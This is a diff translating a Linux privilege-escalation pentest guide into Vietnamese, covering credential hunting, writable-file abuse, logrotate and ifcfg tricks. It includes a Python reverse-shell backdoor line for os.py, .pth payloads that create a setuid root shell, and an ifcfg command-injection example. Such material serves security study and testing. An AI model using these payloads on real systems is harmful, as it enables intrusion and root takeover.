+Kiểm tra các tệp có thể đọc được bên trong thư mục sao lưu, cũng như các tệp có **tên** chứa `backup`: archive có tên khó hiểu hoặc phần mở rộng được mã hóa vẫn có thể làm lộ dữ liệu ứng dụng cũ. Archive được mã hóa chỉ là một dấu hiệu có thể bị lộ. Khôi phục mật khẩu, kiểm tra nội dung, khôi phục hash ứng dụng và dùng lại mật khẩu đó cho tài khoản Unix là các bước riêng biệt cần xác minh; hash trong archive không chứng minh rằng có thể đăng nhập cục bộ.
 
-Readable virtual-machine backups deserve the same review. A VirtualBox `.vbox` configuration can identify attached `.vdi` images and carry encrypted disk-key metadata; [VirtualBox documents that the encrypted data key is stored in the VM configuration](https://docs.oracle.com/en/virtualization/virtualbox/7.0/user/AdvancedTopics.html). The configuration and image must both be accessible before an offline disk review is possible. A guest volume may have its own [LUKS encryption layer](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc), requiring a separate key. Even after authorized decryption, old scripts or configuration may contain a password; establish that the credential is current for a host account and that its effective `sudo` policy permits a privileged command before calling this a local escalation. Inventory paths and permissions without copying, decrypting, or mounting images during passive enumeration.
+Các bản sao lưu máy ảo có thể đọc được cũng cần được kiểm tra tương tự. Cấu hình VirtualBox `.vbox` có thể xác định các image `.vdi` được đính kèm và chứa metadata về khóa đĩa được mã hóa; [VirtualBox ghi rõ khóa dữ liệu được mã hóa được lưu trong cấu hình VM](https://docs.oracle.com/en/virtualization/virtualbox/7.0/user/AdvancedTopics.html). Cần truy cập được cả cấu hình lẫn image thì mới có thể kiểm tra đĩa offline. Volume của máy khách có thể có lớp mã hóa [LUKS riêng](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc), cần một khóa riêng. Ngay cả sau khi giải mã được cấp phép, script hoặc cấu hình cũ vẫn có thể chứa mật khẩu; hãy xác minh thông tin xác thực đó còn dùng được cho tài khoản trên host và chính sách `sudo` hiệu lực của tài khoản cho phép chạy lệnh có đặc quyền trước khi coi đây là một trường hợp leo thang đặc quyền cục bộ. Trong quá trình liệt kê thụ động, chỉ ghi nhận đường dẫn và quyền truy cập; không sao chép, giải mã hoặc mount image.
 
-When inspecting a readable archive, list member names before extracting anything: hidden authenticator files, recovery-code material, or SSH keys may be present even if the live copies are protected. File names only indicate a lead; verify the material and any account reuse separately.
+Khi kiểm tra archive có thể đọc được, hãy liệt kê tên các thành viên trước khi giải nén: các tệp xác thực ẩn, dữ liệu mã khôi phục hoặc SSH key có thể hiện diện ngay cả khi các bản sao đang hoạt động được bảo vệ. Tên tệp chỉ là manh mối; hãy xác minh riêng dữ liệu đó và việc có dùng lại thông tin xác thực hay không.
 
-Prioritize **readable archives owned by another user** in backup directories, especially root-owned archives and those accessible through group membership. An old archive can contain a configuration or authentication secret even when the live copy is protected. For a local backup UI such as [Backrest](https://garethgeorge.github.io/backrest/), check the service's effective account and whether a lower-privilege user can read its configuration or authenticate to the UI. Its [hooks](https://garethgeorge.github.io/backrest/docs/hooks) and [restic command interface](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto) can operate with the daemon's file and command privileges; a loopback listener alone does not determine the impact. Backrest's `passwordBcrypt` is a base64-encoded bcrypt hash in its [authentication code](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go), not a plaintext password. Confirm service identity, usable credentials, and access to the relevant plan or repository before treating an exposed archive or UI as a privilege boundary.
+Ưu tiên các **archive có thể đọc được nhưng thuộc sở hữu của người dùng khác** trong thư mục sao lưu, đặc biệt là archive thuộc sở hữu của root và archive có thể truy cập thông qua tư cách thành viên nhóm. Archive cũ có thể chứa cấu hình hoặc bí mật xác thực ngay cả khi bản sao đang hoạt động được bảo vệ. Với giao diện sao lưu cục bộ như [Backrest](https://garethgeorge.github.io/backrest/), hãy kiểm tra tài khoản hiệu lực của dịch vụ và liệu người dùng có đặc quyền thấp hơn có thể đọc cấu hình hoặc xác thực với UI hay không. [Hooks](https://garethgeorge.github.io/backrest/docs/hooks) và [giao diện lệnh restic](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto) có thể hoạt động với quyền truy cập tệp và lệnh của daemon; chỉ riêng việc listener loopback đang lắng nghe không quyết định mức độ ảnh hưởng. `passwordBcrypt` của Backrest là hash bcrypt được mã hóa base64 trong [mã xác thực](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go), không phải mật khẩu dạng rõ. Hãy xác nhận danh tính dịch vụ, thông tin xác thực có thể sử dụng và quyền truy cập vào plan hoặc repository liên quan trước khi coi archive hoặc UI bị lộ là ranh giới đặc quyền.
 
 ```bash
 find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
 ```
 
-### Known files containing passwords
+### Các tệp đã biết có chứa mật khẩu
 
-Read the code of [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), it searches for **several possible files that could contain passwords**.\
-**Another interesting tool** that you can use to do so is: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) which is an open source application used to retrieve lots of passwords stored on a local computer for Windows, Linux & Mac.
+Đọc mã nguồn của [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS); công cụ này tìm kiếm **một số tệp có khả năng chứa mật khẩu**.\
+**Một công cụ thú vị khác** bạn có thể dùng là [**LaZagne**](https://github.com/AlessandroZ/LaZagne), một ứng dụng mã nguồn mở dùng để truy xuất nhiều mật khẩu được lưu trên máy tính cục bộ chạy Windows, Linux và Mac.
 
-If `/etc/guacamole/guacamole.properties` is readable, review its `mysql-*`, `postgresql-*`, or `sqlserver-*` database connection settings. Where the account is authorized to read the Guacamole JDBC tables, `guacamole_connection_parameter` may contain saved SSH `username`, `password`, `private-key`, or `passphrase` values. Start with connection IDs and parameter names, then inspect only relevant rows; a saved value may be a dynamic token or a vault reference rather than a reusable secret. See the [Guacamole JDBC schema](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html) and [SSH connection parameters](https://guacamole.apache.org/doc/gug/configuring-guacamole.html).
+Nếu có thể đọc `/etc/guacamole/guacamole.properties`, hãy kiểm tra các thiết lập kết nối cơ sở dữ liệu `mysql-*`, `postgresql-*` hoặc `sqlserver-*`. Nếu tài khoản được phép đọc các bảng JDBC của Guacamole, `guacamole_connection_parameter` có thể chứa các giá trị `username`, `password`, `private-key` hoặc `passphrase` SSH đã lưu. Hãy bắt đầu bằng cách xem ID kết nối và tên tham số, sau đó chỉ kiểm tra các hàng liên quan; giá trị đã lưu có thể là token động hoặc tham chiếu đến vault, chứ không phải bí mật có thể tái sử dụng. Xem [lược đồ JDBC của Guacamole](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html) và [các tham số kết nối SSH](https://guacamole.apache.org/doc/gug/configuring-guacamole.html).
 
-The [pswm password manager](https://github.com/Julynx/pswm#usage) stores an encrypted vault at `~/.local/share/pswm/pswm` by default. If another user's vault is visible, check its ownership and whether your account can actually read it. The vault path alone does not reveal credentials; recovering its master password, finding a reusable account password, and confirming that account's privileges are separate steps.
+Trình quản lý mật khẩu [pswm](https://github.com/Julynx/pswm#usage) lưu vault được mã hóa theo mặc định tại `~/.local/share/pswm/pswm`. Nếu có thể thấy vault của người dùng khác, hãy kiểm tra quyền sở hữu và liệu tài khoản của bạn có thực sự đọc được vault đó hay không. Chỉ riêng đường dẫn vault không tiết lộ thông tin xác thực; khôi phục mật khẩu chính, tìm mật khẩu tài khoản có thể tái sử dụng và xác nhận đặc quyền của tài khoản đó là những bước riêng biệt.
 
-[Passpie's default database](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database) is `~/.passpie/`, with a `.keys` keyring and encrypted `.pass` credential files under group directories. A visible database directory is a path lead only: confirm access to the key and relevant encrypted entry, any required master passphrase, and whether a recovered credential belongs to a more privileged account. Passpie also supports [custom database paths](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases), so the default path is not exhaustive. Automated enumeration should list metadata without exporting credentials or printing key material.
+[Thư mục cơ sở dữ liệu mặc định của Passpie](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database) là `~/.passpie/`, chứa một keyring `.keys` và các tệp thông tin xác thực `.pass` được mã hóa trong các thư mục nhóm. Chỉ nhìn thấy thư mục cơ sở dữ liệu mới cho biết vị trí cần kiểm tra; hãy xác nhận quyền truy cập vào khóa và mục được mã hóa liên quan, mọi master passphrase bắt buộc, cũng như liệu thông tin xác thực khôi phục được có thuộc về tài khoản có đặc quyền cao hơn hay không. Passpie cũng hỗ trợ [đường dẫn cơ sở dữ liệu tùy chỉnh](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases), vì vậy đường dẫn mặc định không bao quát mọi trường hợp. Việc liệt kê tự động nên chỉ hiển thị metadata, không xuất thông tin xác thực hoặc in ra dữ liệu khóa.
 
-### Logs
+### Log
 
-If you can read logs, you may be able to find **interesting/confidential information inside them**. The more strange the log is, the more interesting it will be (probably).\
-Also, some "**bad**" configured (backdoored?) **audit logs** may allow you to **record passwords** inside audit logs as explained in this post: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>
+Nếu có thể đọc log, bạn có thể tìm thấy **thông tin đáng chú ý/riêng tư bên trong**. Log càng bất thường thì càng đáng chú ý (có lẽ vậy).\
+Ngoài ra, một số **audit log** được cấu hình “tệ” (có backdoor?) có thể cho phép bạn **ghi lại mật khẩu** trong audit log như được giải thích trong bài viết này: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>
 
 ```bash
 aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
 grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
 ```
 
-In order to **read logs the group** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) will be really helpful.
+Để đọc log, nhóm [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) sẽ rất hữu ích.
 
-### Shell files
+### Các tệp shell
 
 ```bash
 ~/.bash_profile # if it exists, read it once when you log in to the shell
@@ -2224,28 +2224,28 @@ In order to **read logs the group** [**adm**](../../user-information/interesting
 ~/.zshrc #zsh shell
 ```
 
-### Generic Creds Search/Regex
+### Tìm kiếm/Regex Creds tổng quát
 
-You should also check for files containing the word "**password**" in its **name** or inside the **content**, and also check for IPs and emails inside logs, or hashes regexps.\
-I'm not going to list here how to do all of this but if you are interested you can check the last checks that [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) perform.
+Bạn cũng nên kiểm tra các file có từ "**mật khẩu**" trong **tên** hoặc trong **nội dung**, đồng thời kiểm tra IP và email trong log, hoặc các regex hash.\
+Tôi sẽ không liệt kê ở đây cách thực hiện tất cả những việc này, nhưng nếu quan tâm, bạn có thể xem các bước kiểm tra cuối cùng mà [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) thực hiện.
 
-## Writable files
+## File có quyền ghi
 
 ### Python library hijacking
 
-If you know from **where** a python script is going to be executed and you **can write inside** that folder or you can **modify python libraries**, you can modify the OS library and backdoor it (if you can write where python script is going to be executed, copy and paste the os.py library).
+Nếu bạn biết script python sẽ được thực thi **từ đâu** và **có thể ghi vào** thư mục đó hoặc **có thể chỉnh sửa các thư viện python**, bạn có thể chỉnh sửa thư viện OS và cài backdoor vào đó (nếu có thể ghi vào nơi script python được thực thi, hãy sao chép và dán thư viện os.py).
 
-To **backdoor the library** just add at the end of the os.py library the following line (change IP and PORT):
+Để **cài backdoor vào thư viện**, chỉ cần thêm dòng sau vào cuối thư viện os.py (thay đổi IP và PORT):
 
 ```python
 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
 ```
 
-#### Writable `.pth` processed by `site.addsitedir()`
+#### `.pth` có quyền ghi được xử lý bởi `site.addsitedir()`
 
-Do not treat `site.addsitedir(DIR)` as equivalent to `sys.path.append(DIR)`. It also processes every `*.pth` file in `DIR`. A line beginning with `import` followed by a space or tab is executed as Python code. Path lines are instead resolved relative to the site directory and added only when they exist.<sup>[[38]](#references)</sup>
+Đừng xem `site.addsitedir(DIR)` tương đương với `sys.path.append(DIR)`. Hàm này còn xử lý mọi tệp `*.pth` trong `DIR`. Dòng bắt đầu bằng `import`, theo sau là dấu cách hoặc tab, sẽ được thực thi dưới dạng mã Python. Các dòng chứa đường dẫn thì được phân giải tương đối với thư mục site và chỉ được thêm vào nếu đường dẫn đó tồn tại.<sup>[[38]](#references)</sup>
 
-This becomes a privilege escalation when a sudo-allowed or otherwise privileged Python program calls `site.addsitedir()` on a directory writable by the current user or one of their groups. The `.pth` code runs while the privileged program is setting up its import path, before its normal action is dispatched.<sup>[[38]](#references)[[39]](#references)</sup>
+Điều này dẫn đến leo thang đặc quyền khi một chương trình Python được phép chạy bằng sudo hoặc có đặc quyền theo cách khác gọi `site.addsitedir()` với một thư mục mà người dùng hiện tại hoặc một nhóm của họ có quyền ghi. Mã trong tệp `.pth` chạy khi chương trình có đặc quyền đang thiết lập đường dẫn import, trước khi thực hiện hành động thông thường.<sup>[[38]](#references)[[39]](#references)</sup>
 
 ```bash
 # Find explicit consumers and inspect every selected directory's ownership
@@ -2258,7 +2258,7 @@ printf '%s\n' "import os; os.system('id')" > /opt/app/plugins/dev/probe.pth
 sudo /usr/bin/python3 /opt/app/controller.py status
 ```
 
-Executable `.pth` content must fit on one line, but semicolons allow several statements. For example, a root execution path can create a setuid Bash copy; invoke Bash with `-p` so it preserves its effective ID.<sup>[[39]](#references)</sup>
+Nội dung thực thi trong `.pth` phải nằm trên một dòng, nhưng dấu chấm phẩy cho phép dùng nhiều câu lệnh. Ví dụ, một đường dẫn thực thi với quyền root có thể tạo bản sao Bash setuid; gọi Bash với `-p` để giữ nguyên ID hiệu lực của nó.<sup>[[39]](#references)</sup>
 
 ```bash
 printf '%s\n' "import os; os.system('cp /bin/bash /tmp/rootshell; chmod 4755 /tmp/rootshell')" \
@@ -2267,30 +2267,30 @@ sudo /usr/bin/python3 /opt/app/controller.py status
 /tmp/rootshell -p
 ```
 
-The `-S` option only disables Python's automatic `site` initialization. It does not protect a program that explicitly imports `site` and calls `site.addsitedir()`. Remove attacker-writable directories from privileged import paths and require the directory and its `.pth` files to be owned and writable only by the privileged administrator.<sup>[[38]](#references)[[39]](#references)</sup>
+Tùy chọn `-S` chỉ tắt khởi tạo `site` tự động của Python. Tùy chọn này không bảo vệ chương trình chủ động import `site` rồi gọi `site.addsitedir()`. Hãy loại bỏ các thư mục mà kẻ tấn công có thể ghi khỏi đường dẫn import có đặc quyền, đồng thời yêu cầu thư mục và các tệp `.pth` của nó chỉ thuộc sở hữu và chỉ có thể được ghi bởi quản trị viên có đặc quyền.<sup>[[38]](#references)[[39]](#references)</sup>
 
-### Logrotate exploitation
+### Khai thác logrotate
 
-A privileged `logrotate` job can create a cross-user file-write path when it actually rotates a log below a directory that a lower-privileged user can replace or redirect during rotation. A writable log alone is only a lead. Confirm the exact active rule and its `create`, `olddir`, and `su` directives; the scheduler's effective identity; write and search rights on the log's parent; and whether the installed build and policy allow the destination change. A later privileged shell must also load the resulting file for a startup-file write to become command execution. Inspect the schedule, rule, version/packaging, and path metadata without triggering a rotation or attempting the race.
+Một tác vụ `logrotate` có đặc quyền có thể tạo ra đường ghi tệp xuyên người dùng nếu tác vụ thực sự xoay vòng một log nằm dưới thư mục mà người dùng ít đặc quyền hơn có thể thay thế hoặc chuyển hướng trong lúc xoay vòng. Chỉ riêng việc log có thể ghi được mới chỉ là dấu hiệu cần kiểm tra. Hãy xác nhận quy tắc đang hoạt động chính xác cùng các chỉ thị `create`, `olddir` và `su`; danh tính thực tế của bộ lập lịch; quyền ghi và tìm kiếm trên thư mục cha của log; và liệu bản dựng cùng chính sách đã cài đặt có cho phép thay đổi đích hay không. Một shell có đặc quyền được mở sau đó cũng phải tải tệp vừa tạo thì việc ghi vào tệp khởi động mới dẫn đến thực thi lệnh. Kiểm tra lịch chạy, quy tắc, phiên bản/cách đóng gói và metadata của đường dẫn mà không kích hoạt xoay vòng hay thử race.
 
 > [!TIP]
-> Do not treat `3.18.0` or any version string alone as an exploitability cutoff. [Upstream's change log](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md) records directory and symlink hardening in multiple releases, and distributions may backport fixes. The [upstream manual](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in) recommends `su` when root rotates logs in directories controlled by non-privileged users; verify the effective rule and actual behavior.
+> Không coi `3.18.0` hay bất kỳ chuỗi phiên bản nào là ngưỡng duy nhất để xác định khả năng khai thác. [Change log của upstream](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md) ghi nhận các biện pháp hardening thư mục và symlink trong nhiều bản phát hành, và các bản phân phối có thể backport bản sửa lỗi. [Tài liệu hướng dẫn của upstream](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in) khuyến nghị dùng `su` khi root xoay vòng log trong các thư mục do người dùng không có đặc quyền kiểm soát; hãy xác minh quy tắc đang có hiệu lực và hành vi thực tế.
 
-More detailed information about the vulnerability can be found on this page: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>
+Thông tin chi tiết hơn về lỗ hổng có thể tìm thấy tại trang này: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>
 
-You can exploit this vulnerability with [**logrotten**](https://github.com/whotwagner/logrotten).
+Bạn có thể khai thác lỗ hổng này bằng [**logrotten**](https://github.com/whotwagner/logrotten).
 
-This vulnerability is very similar to [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** so whenever you find that you can alter logs, check who is managing those logs and check if you can escalate privileges substituting the logs by symlinks.
+Lỗ hổng này rất giống [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(log nginx),** vì vậy, bất cứ khi nào phát hiện có thể chỉnh sửa log, hãy kiểm tra ai đang quản lý các log đó và liệu có thể leo thang đặc quyền bằng cách thay log bằng symlink hay không.
 
 ### /etc/sysconfig/network-scripts/ (Centos/Redhat)
 
-**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>
+**Tham chiếu lỗ hổng:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>
 
-An `ifcfg-*` file is a review lead when a lower-privileged user can create or change it **and** a privileged network-activation path will read that exact file. Confirm the effective file and directory permissions, the selected interface, the installed `ifup`/`ifdown` implementation, and who invokes it. A writable file alone does not cause execution. [Red Hat's RHEL 7 networking guide](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files) distinguishes legacy network scripts from NetworkManager: the latter does not itself trigger the former. [RHEL 8 documents](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and-managing-networking) that its default `ifup`/`ifdown` use NetworkManager, while the optional legacy package supplies shell scripts.
+Tệp `ifcfg-*` là một dấu hiệu cần kiểm tra khi người dùng ít đặc quyền hơn có thể tạo hoặc chỉnh sửa tệp đó **và** một đường kích hoạt mạng có đặc quyền sẽ đọc chính xác tệp đó. Hãy xác nhận quyền hiệu lực trên tệp và thư mục, giao diện được chọn, cách triển khai `ifup`/`ifdown` đã cài đặt và người gọi chúng. Chỉ riêng việc tệp có thể ghi được không gây ra thực thi. [Hướng dẫn mạng RHEL 7 của Red Hat](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files) phân biệt các network script cũ với NetworkManager: bản thân NetworkManager không kích hoạt các script cũ. [Tài liệu RHEL 8](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and-managing-networking) nêu rằng `ifup`/`ifdown` mặc định của phiên bản này sử dụng NetworkManager, còn gói legacy tùy chọn cung cấp các shell script.
 
-On a system actually using privileged legacy scripts, an unquoted, shell-sourced `ifcfg-*` assignment such as `NAME=` can cross a code-execution boundary. Verify the exact parser, value, and activation path; do not infer shell interpretation from the filename or NetworkManager's presence. A sudo-allowed wrapper that writes caller input into an `ifcfg-*` file and then calls legacy `ifup` is a separate route to this boundary even when the caller cannot directly edit the file.
+Trên hệ thống thực sự dùng các script legacy có đặc quyền, một phép gán `ifcfg-*` không được trích dẫn và được nạp bằng shell, chẳng hạn `NAME=`, có thể vượt qua ranh giới thực thi mã. Hãy xác minh parser, giá trị và đường kích hoạt chính xác; đừng suy luận rằng shell sẽ diễn giải tệp chỉ dựa trên tên tệp hoặc sự hiện diện của NetworkManager. Một wrapper được phép chạy bằng sudo, ghi đầu vào của người gọi vào tệp `ifcfg-*` rồi gọi `ifup` legacy, là một đường riêng dẫn đến ranh giới này ngay cả khi người gọi không thể trực tiếp chỉnh sửa tệp.
 
-For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
+Ví dụ: _/etc/sysconfig/network-scripts/ifcfg-1337_
 
 ```bash
 NAME=Network /bin/id
@@ -2298,26 +2298,26 @@ ONBOOT=yes
 DEVICE=eth0
 ```
 
-(_Note the blank space between Network and /bin/id_)
+(_Lưu ý khoảng trắng giữa Network và /bin/id_)
 
-### **init, init.d, systemd, and rc.d**
+### **init, init.d, systemd, và rc.d**
 
-The directory `/etc/init.d` is home to **scripts** for System V init (SysVinit), the **classic Linux service management system**. It includes scripts to `start`, `stop`, `restart`, and sometimes `reload` services. These can be executed directly or through symbolic links found in `/etc/rc?.d/`. An alternative path in Redhat systems is `/etc/rc.d/init.d`.
+Thư mục `/etc/init.d` chứa các **script** dành cho System V init (SysVinit), **hệ thống quản lý dịch vụ Linux cổ điển**. Thư mục này bao gồm các script để `start`, `stop`, `restart` và đôi khi `reload` dịch vụ. Có thể thực thi chúng trực tiếp hoặc thông qua các symbolic link trong `/etc/rc?.d/`. Một đường dẫn thay thế trên các hệ thống Redhat là `/etc/rc.d/init.d`.
 
-On the other hand, `/etc/init` is associated with **Upstart**, a newer **service management** introduced by Ubuntu, using configuration files for service management tasks. Despite the transition to Upstart, SysVinit scripts are still utilized alongside Upstart configurations due to a compatibility layer in Upstart.
+Mặt khác, `/etc/init` liên quan đến **Upstart**, một hệ thống **quản lý dịch vụ** mới hơn do Ubuntu giới thiệu, sử dụng các file cấu hình để quản lý dịch vụ. Dù đã chuyển sang Upstart, các script SysVinit vẫn được sử dụng song song với cấu hình Upstart nhờ lớp tương thích của Upstart.
 
-**systemd** emerges as a modern initialization and service manager, offering advanced features such as on-demand daemon starting, automount management, and system state snapshots. It organizes files into `/usr/lib/systemd/` for distribution packages and `/etc/systemd/system/` for administrator modifications, streamlining the system administration process.<sup>[[21]](#references)</sup>
+**systemd** là một trình quản lý dịch vụ và khởi tạo hiện đại, cung cấp các tính năng nâng cao như khởi chạy daemon theo yêu cầu, quản lý automount và chụp ảnh trạng thái hệ thống. Các file được tổ chức trong `/usr/lib/systemd/` dành cho các gói phân phối và `/etc/systemd/system/` dành cho các thay đổi của quản trị viên, giúp đơn giản hóa quy trình quản trị hệ thống.<sup>[[21]](#references)</sup>
 
-## Other Tricks
+## Các thủ thuật khác
 
-### NFS Privilege escalation
+### Nâng quyền qua NFS
 
 
 {{#ref}}
 ../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
 {{#endref}}
 
-### Escaping from restricted Shells
+### Thoát khỏi Shell bị giới hạn
 
 
 {{#ref}}
@@ -2331,89 +2331,88 @@ On the other hand, `/etc/init` is associated with **Upstart**, a newer **service
 ../../network-information/cisco-vmanage.md
 {{#endref}}
 
-## Android rooting frameworks: manager-channel abuse
+## Framework rooting Android: lạm dụng manager-channel
 
-Android rooting frameworks commonly hook a syscall to expose privileged kernel functionality to a userspace manager. Weak manager authentication (e.g., signature checks based on FD-order or poor password schemes) can enable a local app to impersonate the manager and escalate to root on already-rooted devices. Learn more and exploitation details here:
+Các framework rooting Android thường hook một syscall để cho phép manager ở userspace truy cập chức năng kernel có đặc quyền. Cơ chế xác thực manager yếu (ví dụ: kiểm tra chữ ký dựa trên thứ tự FD hoặc cơ chế mật khẩu kém) có thể cho phép một app cục bộ giả mạo manager và nâng quyền lên root trên các thiết bị đã được root. Tìm hiểu thêm và xem chi tiết khai thác tại đây:
 
 
 {{#ref}}
 ../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
 {{#endref}}
 
-## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)
+## Khám phá service VMware Tools gây LPE (CWE-426) qua exec dựa trên regex (CVE-2025-41244)
 
-Regex-driven service discovery in VMware Tools/Aria Operations can extract a binary path from process command lines and execute it with -v under a privileged context. Permissive patterns (e.g., using \S) may match attacker-staged listeners in writable locations (e.g., /tmp/httpd), leading to execution as root (CWE-426 Untrusted Search Path).<sup>[[27]](#references)</sup>
+Cơ chế khám phá service dựa trên regex trong VMware Tools/Aria Operations có thể trích xuất đường dẫn binary từ command line của tiến trình rồi thực thi binary đó với -v trong ngữ cảnh có đặc quyền. Các pattern quá rộng (ví dụ: dùng \S) có thể khớp với listener do attacker đặt sẵn ở vị trí có thể ghi (ví dụ: /tmp/httpd), dẫn đến thực thi với quyền root (CWE-426 Untrusted Search Path).<sup>[[27]](#references)</sup>
 
-Learn more and see a generalized pattern applicable to other discovery/monitoring stacks here:
+Tìm hiểu thêm và xem một pattern tổng quát có thể áp dụng cho các hệ thống khám phá/giám sát khác tại đây:
 
 {{#ref}}
 ../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
 {{#endref}}
 
-## Kernel Security Protections
+## Các biện pháp bảo vệ Kernel
 
 - [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
 - [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)
 
-## More help
+## Trợ giúp thêm
 
-[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)
+[Binary impacket tĩnh](https://github.com/ropnop/impacket_static_binaries)
 
-## Linux/Unix Privesc Tools
+## Công cụ Privesc trên Linux/Unix
 
-### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
+### **Công cụ tốt nhất để tìm các vector nâng quyền cục bộ trên Linux:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
 
-**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
+**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(tùy chọn -t)\
 **Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
 **Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
 **Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
 **BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
-**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
+**Kernelpop:** Liệt kê các lỗ hổng kernel trên Linux và MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
 **Mestaploit:** _**multi/recon/local_exploit_suggester**_\
 **Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
-**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
-**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)
+**EvilAbigail (truy cập vật lý):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
+**Tổng hợp thêm các script**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)
 
 ## References
 
-- [1] [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
-- [2] [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
